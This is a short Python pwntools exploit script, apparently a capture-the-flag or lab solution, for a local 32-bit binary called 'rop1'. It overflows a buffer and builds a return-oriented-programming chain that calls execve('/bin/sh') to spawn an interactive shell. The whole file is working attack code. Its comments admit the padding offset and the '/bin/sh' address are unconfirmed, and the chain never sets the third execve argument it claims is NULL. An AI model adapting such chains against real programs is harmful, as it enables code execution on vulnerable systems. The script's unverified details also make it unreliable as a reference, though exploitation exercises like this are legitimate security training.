from pwn import *

# Target binary
elf = ELF('./rop1')

# Gadgets
POP_EAX = 0x0804919a
POP_EBX = 0x0804901e
POP_ECX = 0x080491a4
INT_80  = 0x080491b4
BINSH   = 0x0804b008  # This is where "/bin/sh" should be

# Build our ROP chain
payload = b"A" * 28  # We need to confirm this offset in GDB

# execve("/bin/sh", NULL, NULL) 
payload += p32(POP_EAX)
payload += p32(0xb)       # execve syscall number
payload += p32(POP_EBX)
payload += p32(BINSH)     # pointer to "/bin/sh"
payload += p32(POP_ECX)
payload += p32(0)         # NULL
payload += p32(INT_80)

# Save payload
with open('payload', 'wb') as f:
    f.write(payload)

p = process('./rop1')
p.sendline(payload)
p.interactive()
